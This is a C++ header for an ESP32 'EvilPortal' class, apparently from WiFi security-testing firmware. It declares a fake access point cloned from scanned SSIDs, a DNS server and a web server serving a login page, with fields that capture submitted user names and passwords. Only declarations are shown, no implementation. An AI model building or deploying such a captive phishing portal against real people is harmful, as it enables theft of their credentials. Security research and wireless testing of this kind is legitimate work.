#pragma once
#ifndef EvilPortal_h
#define EvilPortal_h

#include "Arduino.h"
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include "WiFiScan.h"  // Incluindo WiFiScan.h para declarar ssid e AccessPoint

#include <vector>
#include <lvgl.h>
#include "settings.h"
#include "SDInterface.h"
#include "Display.h"


extern Settings settings_obj;
extern SDInterface sd_obj;
extern Display display_obj;

#define MAX_HTML_SIZE 4096

class EvilPortal {
public:
  EvilPortal();
  void setup();
  bool begin(const std::vector<WiFiScan::SSID>& ssids, const std::vector<WiFiScan::AccessPoint>& access_points);
  bool runMain(uint8_t scan_mode);
  String get_user_name();
  String get_password();

  String target_html_name = "index.html";
  bool using_serial_html = false;
  int selected_html_index = 0;
  std::vector<String> html_files;

private:
  void startPortal();
  void startAP();
  void setupServer();
  void sendToDisplay(String msg);
  bool setAP(const std::vector<WiFiScan::SSID>& ssids, const std::vector<WiFiScan::AccessPoint>& access_points);
  bool setHtml();
  void setHtmlFromSerial();

  bool runServer;
  bool name_received;
  bool password_received;
  bool has_html;
  bool has_ap;

  char apName[32];
  char index_html[MAX_HTML_SIZE];
  String user_name;
  String password;

  DNSServer dnsServer;
};

#endif
